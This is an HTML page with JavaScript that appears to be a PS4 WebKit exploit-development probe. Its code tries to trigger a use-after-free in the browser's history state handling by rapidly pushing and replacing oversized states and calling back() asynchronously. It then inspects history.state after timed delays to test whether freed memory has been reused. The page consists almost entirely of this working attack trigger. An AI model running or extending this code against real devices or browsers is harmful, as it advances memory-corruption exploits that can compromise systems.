<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - 32B History Cell Probe</title>
<style>
body { background:#000; color:#0f0; font-family:monospace; }
pre { white-space:pre-wrap; }
button { font-size:16px; margin:10px; }
</style>
</head>
<body>

<h2>History ~32B Cell Identification Probe 2</h2>
<button onclick="run()">RUN TEST</button>
<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
const log = m => logEl.textContent += m + "\n";
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function triggerUAF(){
    let size = 977;
    const STEP = 14461;

    log("=== UAF TRIGGER START ===");

    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);
        history.pushState({x:i}, "", "#"+frag);
        history.replaceState({y:i}, "", "#"+frag.slice(0, frag.length >> 1));

        if(i % 6 === 0){
            setTimeout(()=>history.back(),0);
            log("[ITER "+i+"] back() async");
        }

        size += STEP;
        await sleep(5);
    }

    log(">>> UAF WINDOW <<<");
    await sleep(120);
}

function inspectState(tag){
    let s = history.state;
    log(`\n[${tag}] typeof = ${typeof s}`);
    try { log(`[${tag}] JSON = ${JSON.stringify(s)}`); } catch(e){ log(`[${tag}] JSON ERROR`); }
    try { log(`[${tag}] clone = ${structuredClone(s)}`); } catch(e){ log(`[${tag}] clone ERROR`); }
    try { log(`[${tag}] keys = ${Object.keys(s)}`); } catch(e){ log(`[${tag}] keys ERROR`); }
}

async function run(){
    logEl.textContent = "";
    await triggerUAF();

    // Baseline immediately in window
    inspectState("BASE");

    // Force small serialized replacement
    history.replaceState({k:1}, "", "#X");
    log("\n[INFO] replaceState with minimal payload");

    await sleep(20);
    inspectState("POST-REPLACE");

    // Temporal access (critical)
    await sleep(50);
    inspectState("DELAYED");

    log("\n=== END TEST ===");
}
</script>

</body>
</html>
